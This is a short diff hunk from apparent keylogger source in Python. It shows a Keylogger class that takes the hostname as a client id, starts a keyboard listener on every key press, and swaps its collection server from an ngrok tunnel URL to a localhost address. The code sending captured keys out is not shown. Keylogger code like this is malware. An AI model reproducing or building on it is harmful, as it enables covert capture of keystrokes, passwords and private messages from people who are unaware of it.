@@ -9,7 +9,7 @@ import psutil
 class Keylogger:
     def __init__(self):
         self.client_id = socket.gethostname()
-        self.server_url = "https://trusted-werewolf-premium.ngrok-free.app"
+        self.server_url = "http://127.0.0.1:8000"
 
         self.listener = keyboard.Listener(on_press=self.on_key_press)
         self.listener.start()
